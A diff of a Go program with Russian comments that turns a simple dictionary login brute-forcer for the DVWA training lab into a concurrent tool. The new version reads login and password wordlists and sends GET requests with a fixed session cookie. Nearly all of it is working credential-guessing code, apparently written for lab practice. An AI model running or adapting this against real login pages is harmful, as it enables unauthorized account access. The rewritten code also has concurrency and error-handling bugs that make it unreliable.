@@ -1,103 +1,83 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
-	"io/ioutil"
-	"log"
+	"io"
 	"net/http"
-	"net/http/cookiejar" // Пакет cookiejar из стандартной библиотеки
-	"net/url"
+	"os"
 	"strings"
-	"time"
+	"sync"
 )
 
-// Функция для отправки POST-запроса на форму авторизации
-func tryLogin(username, password string, client *http.Client) bool {
-	// URL страницы входа в DVWA
-	loginURL := "http://localhost/dvwa/vulnerabilities/brute/"
-
-	// Подготовка данных формы для отправки
-	data := url.Values{}
-	data.Set("username", username)
-	data.Set("password", password)
-	data.Set("Login", "Login")
-
-	// Отправка POST-запроса
-	req, err := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
-	if err != nil {
-		log.Println("Ошибка при создании запроса:", err)
-		return false
-	}
-
-	// Устанавливаем заголовки
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	req.Header.Set("User-Agent", "GoBot")
-
-	// Выполнение запроса
-	resp, err := client.Do(req)
-	if err != nil {
-		log.Println("Ошибка при выполнении запроса:", err)
-		return false
-	}
-	defer resp.Body.Close()
-
-	// Чтение ответа
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		log.Println("Ошибка при чтении ответа:", err)
-		return false
-	}
-
-	// Печать тела ответа для отладки
-	// fmt.Println(string(body))
-
-	// Проверка на неправильный логин и пароль
-	if strings.Contains(string(body), "Username and/or password incorrect") {
-		// Неверный пароль
-		return false
-	}
-
-	// Проверка на успешную авторизацию (например, отсутствие формы на странице)
-	if !strings.Contains(string(body), "username") && !strings.Contains(string(body), "password") {
-		// Если форма больше не содержится на странице, значит, вход успешен
-		return true
-	}
-
-	// Если не нашли ошибки и форма всё ещё присутствует, то вход неудачен
-	return false
-}
-
 func main() {
-	// Имя пользователя (предполагается, что оно известно)
-	username := "admin"
+	url := "http://localhost/dvwa/vulnerabilities/brute/?username=%v&password=%v&Login=Login#"
+	client := new(http.Client)
 
-	// Словарь паролей
-	passwords := []string{
-		"admin123",
-		"password",
-		"123456",
-		"password1",
-		"letmein",
-		"password", // правильный пароль
-		// Добавьте другие пароли в словарь
-	}
-
-	// Создаём HTTP клиент с поддержкой cookies
-	jar, err := cookiejar.New(nil) // создаем новый CookieJar
+	var okLogin, okPass string
+	loginFile, err := os.Open("login_list.txt")
 	if err != nil {
-		log.Fatal("Ошибка при создании CookieJar:", err)
+		fmt.Println(err)
+		return
 	}
-	client := &http.Client{
-		Jar: jar,
+	defer loginFile.Close()
+
+	loginScanner := bufio.NewScanner(loginFile)
+	wg := new(sync.WaitGroup)
+	for loginScanner.Scan() {
+		login := loginScanner.Text()
+		login = strings.Replace(login, " ", "+", -1)
+		wg.Add(1)
+		go func() {
+			passFile, err := os.Open("password_list.txt")
+			if err != nil {
+				fmt.Println(err)
+				return
+			}
+
+			passScanner := bufio.NewScanner(passFile)
+
+			for passScanner.Scan() {
+				pass := passScanner.Text()
+				pass = strings.Replace(pass, " ", "+", -1)
+				req, err := http.NewRequest(http.MethodGet, fmt.Sprintf(url, login, pass), nil)
+				req.Header.Add("Cookie", "PHPSESSID=9jkge3ibsrqj8atog5bnt1ta63; security=low")
+				if err != nil {
+					fmt.Println(err)
+					return
+				}
+				resp, err := client.Do(req)
+				if err != nil {
+					fmt.Println(err)
+					return
+				}
+				if resp.StatusCode != 200 {
+					fmt.Printf("status code = %v\n", resp.StatusCode)
+					continue
+				}
+				body, err := io.ReadAll(resp.Body)
+				if err != nil {
+					fmt.Println(err)
+					return
+				}
+				bodyStr := string(body)
+				if !strings.Contains(bodyStr, "Username and/or password incorrect") {
+					fmt.Printf("SUCCESS!\nlogin: %v\npass: %v\n", login, pass)
+					okLogin = login
+					okPass = pass
+				}
+			}
+			passFile.Close()
+			wg.Done()
+		}()
+	}
+	wg.Wait()
+
+	if err := loginScanner.Err(); err != nil {
+		fmt.Println(err)
 	}
 
-	// Перебор паролей
-	for _, password := range passwords {
-		if tryLogin(username, password, client) {
-			// Выводим успешную пару логин/пароль
-			fmt.Printf("Найден правильный логин и пароль: %s:%s\n", username, password)
-			break
-		}
-		time.Sleep(1 * time.Second) // Добавляем задержку между попытками
+	if okPass == "" && okLogin == "" {
+		fmt.Printf("Пароль не найден!\n")
 	}
 }
